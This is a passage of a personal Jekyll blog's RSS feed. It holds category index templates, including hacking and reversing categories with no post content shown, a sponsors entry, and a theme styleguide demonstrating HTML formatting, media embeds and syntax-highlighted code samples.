 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>https://touBVa.github.io/blog/categories/reversing/</link>
          </item>
        
      
    
      
        
          <item>
            <title>Guides</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.sample_category %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>https://touBVa.github.io/blog/categories/sample_category/</link>
          </item>
        
      
    
      
    
      
        
          <item>
            <title>Our Sponsors</title>
            <description>Thanks to all the amazing contributors and our Backers for the support.

- [Dirish Mohan](https://dirishmohan.com)</description>
            <link>https://touBVa.github.io/sponsors/</link>
          </item>
        
      
    
      
        
          <item>
            <title>Styleguide</title>
            <description>### devlopr - Styleguide

&lt;hr /&gt;

 &lt;img src=&quot;/assets/img/styleguide.png&quot; class=&quot;img-fluid&quot;&gt;

&lt;p&gt; Lets try the different text styles  &lt;b&gt; Bold &lt;/b&gt; , &lt;strong&gt; Strong &lt;/strong&gt;, &lt;em&gt; Emphasis &lt;/em&gt;, &lt;i&gt; Italic &lt;/i&gt; &lt;/p&gt;


&lt;p&gt; Now, lets try different heading styles : &lt;/p&gt;

&lt;h1&gt; Hello in h1 ! &lt;/h1&gt;
&lt;h2&gt; Hello in h2 ! &lt;/h2&gt;
&lt;h3&gt; Hello in h3 ! &lt;/h3&gt;
&lt;h4&gt; Hello in h4 ! &lt;/h4&gt;
&lt;h5&gt; Hello in h5 ! &lt;/h5&gt;
&lt;h6&gt; Hello in h6 ! &lt;/h6&gt;

&lt;hr /&gt;
&lt;p&gt; Unordered List &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt; List Item 1 &lt;/li&gt;
&lt;li&gt; List Item 2 &lt;/li&gt;
&lt;li&gt; List Item 3 &lt;/li&gt;
&lt;li&gt; List Item 4 &lt;/li&gt;
&lt;li&gt; List Item 5 &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt; Ordered List &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt; List Item 1 &lt;/li&gt;
&lt;li&gt; List Item 2 &lt;/li&gt;
&lt;li&gt; List Item 3 &lt;/li&gt;
&lt;li&gt; List Item 4 &lt;/li&gt;
&lt;li&gt; List Item 5 &lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
&lt;p&gt;This is a Block Quote,  It can Expand Multiple Lines &lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;You can use the mark tag to &lt;mark&gt;highlight&lt;/mark&gt; text. &lt;/p&gt;

&lt;p&gt;&lt;del&gt; This line of text is meant to be deleted text &lt;/del&gt; &lt;/p&gt;

&lt;p&gt;&lt;u&gt;This line of text will render as underlined&lt;/u&gt;&lt;/p&gt;
&lt;p&gt;&lt;small&gt;This line of text is meant to be treated as fine print.&lt;/small&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;This line rendered as bold text.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;This line rendered as italicized text.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;abbr title=&quot;attribute&quot;&gt;attr&lt;/abbr&gt;&lt;/p&gt;
&lt;p&gt;&lt;abbr title=&quot;HyperText Markup Language&quot; class=&quot;initialism&quot;&gt;HTML&lt;/abbr&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;div class=&quot;responsive-table&quot;&gt;
&lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th scope=&quot;col&quot;&gt;#&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;th scope=&quot;row&quot;&gt;1&lt;/th&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;th scope=&quot;row&quot;&gt;2&lt;/th&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;th scope=&quot;row&quot;&gt;3&lt;/th&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
          &lt;td&gt;Cell&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
    &lt;/div&gt;

&lt;hr /&gt;

&lt;h3&gt; Instagram Embed &lt;/h3&gt;

&lt;blockquote class=&quot;instagram-media&quot; data-instgrm-captioned data-instgrm-permalink=&quot;https://www.instagram.com/p/CBXO7AypXkM/?utm_source=ig_embed&amp;amp;utm_campaign=loading&quot; data-instgrm-version=&quot;13&quot; style=&quot; background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:540px; min-width:326px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);&quot;&gt;&lt;div style=&quot;padding:16px;&quot;&gt; &lt;a href=&quot;https://www.instagram.com/p/CBXO7AypXkM/?utm_source=ig_embed&amp;amp;utm_campaign=loading&quot; style=&quot; background:#FFFFFF; line-height:0; padding:0 0; text-align:center; text-decoration:none; width:100%;&quot; target=&quot;_blank&quot;&gt; &lt;div style=&quot; display: flex; flex-direction: row; align-items: center;&quot;&gt; &lt;div style=&quot;background-color: #F4F4F4; border-radius: 50%; flex-grow: 0; height: 40px; margin-right: 14px; width: 40px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot;display: flex; flex-direction: column; flex-grow: 1; justify-content: center;&quot;&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; margin-bottom: 6px; width: 100px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; width: 60px;&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot;padding: 19% 0;&quot;&gt;&lt;/div&gt; &lt;div style=&quot;display:block; height:50px; margin:0 auto 12px; width:50px;&quot;&gt;&lt;svg width=&quot;50px&quot; height=&quot;50px&quot; viewBox=&quot;0 0 60 60&quot; version=&quot;1.1&quot; xmlns=&quot;https://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;https://www.w3.org/1999/xlink&quot;&gt;&lt;g stroke=&quot;none&quot; stroke-width=&quot;1&quot; fill=&quot;none&quot; fill-rule=&quot;evenodd&quot;&gt;&lt;g transform=&quot;translate(-511.000000, -20.000000)&quot; fill=&quot;#000000&quot;&gt;&lt;g&gt;&lt;path d=&quot;M556.869,30.41 C554.814,30.41 553.148,32.076 553.148,34.131 C553.148,36.186 554.814,37.852 556.869,37.852 C558.924,37.852 560.59,36.186 560.59,34.131 C560.59,32.076 558.924,30.41 556.869,30.41 M541,60.657 C535.114,60.657 530.342,55.887 530.342,50 C530.342,44.114 535.114,39.342 541,39.342 C546.887,39.342 551.658,44.114 551.658,50 C551.658,55.887 546.887,60.657 541,60.657 M541,33.886 C532.1,33.886 524.886,41.1 524.886,50 C524.886,58.899 532.1,66.113 541,66.113 C549.9,66.113 557.115,58.899 557.115,50 C557.115,41.1 549.9,33.886 541,33.886 M565.378,62.101 C565.244,65.022 564.756,66.606 564.346,67.663 C563.803,69.06 563.154,70.057 562.106,71.106 C561.058,72.155 560.06,72.803 558.662,73.347 C557.607,73.757 556.021,74.244 553.102,74.378 C549.944,74.521 548.997,74.552 541,74.552 C533.003,74.552 532.056,74.521 528.898,74.378 C525.979,74.244 524.393,73.757 523.338,73.347 C521.94,72.803 520.942,72.155 519.894,71.106 C518.846,70.057 518.197,69.06 517.654,67.663 C517.244,66.606 516.755,65.022 516.623,62.101 C516.479,58.943 516.448,57.996 516.448,50 C516.448,42.003 516.479,41.056 516.623,37.899 C516.755,34.978 517.244,33.391 517.654,32.338 C518.197,30.938 518.846,29.942 519.894,28.894 C520.942,27.846 521.94,27.196 523.338,26.654 C524.393,26.244 525.979,25.756 528.898,25.623 C532.057,25.479 533.004,25.448 541,25.448 C548.997,25.448 549.943,25.479 553.102,25.623 C556.021,25.756 557.607,26.244 558.662,26.654 C560.06,27.196 561.058,27.846 562.106,28.894 C563.154,29.942 563.803,30.938 564.346,32.338 C564.756,33.391 565.244,34.978 565.378,37.899 C565.522,41.056 565.552,42.003 565.552,50 C565.552,57.996 565.522,58.943 565.378,62.101 M570.82,37.631 C570.674,34.438 570.167,32.258 569.425,30.349 C568.659,28.377 567.633,26.702 565.965,25.035 C564.297,23.368 562.623,22.342 560.652,21.575 C558.743,20.834 556.562,20.326 553.369,20.18 C550.169,20.033 549.148,20 541,20 C532.853,20 531.831,20.033 528.631,20.18 C525.438,20.326 523.257,20.834 521.349,21.575 C519.376,22.342 517.703,23.368 516.035,25.035 C514.368,26.702 513.342,28.377 512.574,30.349 C511.834,32.258 511.326,34.438 511.181,37.631 C511.035,40.831 511,41.851 511,50 C511,58.147 511.035,59.17 511.181,62.369 C511.326,65.562 511.834,67.743 512.574,69.651 C513.342,71.625 514.368,73.296 516.035,74.965 C517.703,76.634 519.376,77.658 521.349,78.425 C523.257,79.167 525.438,79.673 528.631,79.82 C531.831,79.965 532.853,80.001 541,80.001 C549.148,80.001 550.169,79.965 553.369,79.82 C556.562,79.673 558.743,79.167 560.652,78.425 C562.623,77.658 564.297,76.634 565.965,74.965 C567.633,73.296 568.659,71.625 569.425,69.651 C570.167,67.743 570.674,65.562 570.82,62.369 C570.966,59.17 571,58.147 571,50 C571,41.851 570.966,40.831 570.82,37.631&quot;&gt;&lt;/path&gt;&lt;/g&gt;&lt;/g&gt;&lt;/g&gt;&lt;/svg&gt;&lt;/div&gt;&lt;div style=&quot;padding-top: 8px;&quot;&gt; &lt;div style=&quot; color:#3897f0; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:550; line-height:18px;&quot;&gt; View this post on Instagram&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot;padding: 12.5% 0;&quot;&gt;&lt;/div&gt; &lt;div style=&quot;display: flex; flex-direction: row; margin-bottom: 14px; align-items: center;&quot;&gt;&lt;div&gt; &lt;div style=&quot;background-color: #F4F4F4; border-radius: 50%; height: 12.5px; width: 12.5px; transform: translateX(0px) translateY(7px);&quot;&gt;&lt;/div&gt; &lt;div style=&quot;background-color: #F4F4F4; height: 12.5px; transform: rotate(-45deg) translateX(3px) translateY(1px); width: 12.5px; flex-grow: 0; margin-right: 14px; margin-left: 2px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot;background-color: #F4F4F4; border-radius: 50%; height: 12.5px; width: 12.5px; transform: translateX(9px) translateY(-18px);&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot;margin-left: 8px;&quot;&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 50%; flex-grow: 0; height: 20px; width: 20px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot; width: 0; height: 0; border-top: 2px solid transparent; border-left: 6px solid #f4f4f4; border-bottom: 2px solid transparent; transform: translateX(16px) translateY(-4px) rotate(30deg)&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot;margin-left: auto;&quot;&gt; &lt;div style=&quot; width: 0px; border-top: 8px solid #F4F4F4; border-right: 8px solid transparent; transform: translateY(16px);&quot;&gt;&lt;/div&gt; &lt;div style=&quot; background-color: #F4F4F4; flex-grow: 0; height: 12px; width: 16px; transform: translateY(-4px);&quot;&gt;&lt;/div&gt; &lt;div style=&quot; width: 0; height: 0; border-top: 8px solid #F4F4F4; border-left: 8px solid transparent; transform: translateY(-4px) translateX(8px);&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt; &lt;div style=&quot;display: flex; flex-direction: column; flex-grow: 1; justify-content: center; margin-bottom: 24px;&quot;&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; margin-bottom: 6px; width: 224px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; width: 144px;&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;p style=&quot; color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;&quot;&gt;&lt;a href=&quot;https://www.instagram.com/p/CBXO7AypXkM/?utm_source=ig_embed&amp;amp;utm_campaign=loading&quot; style=&quot; color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;&quot; target=&quot;_blank&quot;&gt;A post shared by Sujay (@sujaykundu777)&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;&lt;/blockquote&gt; &lt;script async src=&quot;//www.instagram.com/embed.js&quot;&gt;&lt;/script&gt;

&lt;hr&gt;

&lt;h3&gt; Twitter Embed &lt;/h3&gt;

&lt;blockquote class=&quot;twitter-tweet&quot; data-lang=&quot;en&quot;&gt;&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;I just published “Deploying a blog using Jekyll and Github Pages with SSL certificate for Free” &lt;a href=&quot;https://t.co/B3T3IQVU93&quot;&gt;https://t.co/B3T3IQVU93&lt;/a&gt;&lt;/p&gt;&amp;mdash; Sujay Kundu (@SujayKundu777) &lt;a href=&quot;https://twitter.com/SujayKundu777/status/1012601950469160962?ref_src=twsrc%5Etfw&quot;&gt;June 29, 2018&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async src=&quot;https://platform.twitter.com/widgets.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;

&lt;hr /&gt;


&lt;h3&gt;YouTube Responsive Embed&lt;/h3&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/bBpKMH3nBzE?rel=0&amp;amp;controls=0&amp;amp;showinfo=0&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;h3&gt;Vimeo Responsive Embed&lt;/h3&gt;

&lt;iframe src=&quot;https://player.vimeo.com/video/212114694?title=0&amp;amp;byline=0&amp;amp;portrait=0&quot; width=&quot;640&quot; height=&quot;360&quot; frameborder=&quot;0&quot; webkitallowfullscreen=&quot;&quot; mozallowfullscreen=&quot;&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;ted-responsive-embed&quot;&gt;TED Responsive Embed&lt;/h3&gt;

&lt;iframe src=&quot;https://embed.ted.com/talks/ted_halstead_a_climate_solution_where_all_sides_can_win&quot; width=&quot;640&quot; height=&quot;360&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;twitch-responsive-embed&quot;&gt;Twitch Responsive Embed&lt;/h3&gt;

&lt;iframe src=&quot;https://player.twitch.tv/?autoplay=false&amp;amp;video=v248755437&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;true&quot; scrolling=&quot;no&quot; height=&quot;378&quot; width=&quot;620&quot;&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;soundcloud-embed&quot;&gt;SoundCloud Embed&lt;/h3&gt;

&lt;iframe width=&quot;100%&quot; height=&quot;166&quot; scrolling=&quot;no&quot; frameborder=&quot;no&quot; src=&quot;https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/29738591&amp;amp;color=ff5500&amp;amp;auto_play=false&amp;amp;hide_related=false&amp;amp;show_comments=true&amp;amp;show_user=true&amp;amp;show_reposts=false&quot;&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;codepen-embed&quot;&gt;CodePen Embed&lt;/h3&gt;

&lt;p data-height=&quot;265&quot; data-theme-id=&quot;light&quot; data-slug-hash=&quot;YWvpRo&quot; data-default-tab=&quot;css,result&quot; data-user=&quot;kharrop&quot; data-embed-version=&quot;2&quot; data-pen-title=&quot;Referral Form&quot; class=&quot;codepen&quot;&gt;&lt;/p&gt;
&lt;script async=&quot;&quot; src=&quot;https://production-assets.codepen.io/assets/embed/ei.js&quot;&gt;&lt;/script&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;syntax-highlighting&quot;&gt;Syntax Highlighting&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;s1&quot;&gt;&apos;use strict&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;markdown&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;markdown&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;markdown&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;preview&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;update&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;preview&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;markdown&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toHTML&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;You can add inline code just like this, E.g. &lt;code class=&quot;highlighter-rouge&quot;&gt;.code { color: #fff; }&lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nt&quot;&gt;pre&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;#f4f4f4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nl&quot;&gt;max-width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;100%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nl&quot;&gt;overflow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;auto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;github-gist-embed&quot;&gt;GitHub gist Embed&lt;/h3&gt;

&lt;script src=&quot;https://gist.github.com/ahmadajmi/dbb4f713317721668bcbc39420562afc.js&quot;&gt;&lt;/script&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;input-style&quot;&gt;Input Style&lt;/h3&gt;

&lt;p&gt;&lt;input type=&quot;text&quot; placeholder=&quot;I&apos;m an input field!&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;


</description>
            <link>https://touBVa.github.io/styleguide/</link>
          </item>
        
      
    
      
        
          <item>
            <title>system_hacking</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.system_hacking %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>https://touBVa.github.io/blog/categories/system_hacking/</link>
          </item>
        
      
    
      
        
          <item>
            <title>Web Hacking</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.web_hacking %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>https://touBVa.github.io/blog/categories/web_hacking/</link>
          </item>
        
      
    
      
    
      
    
      
    
      
    
      
    
      
    

  </channel>
</rss>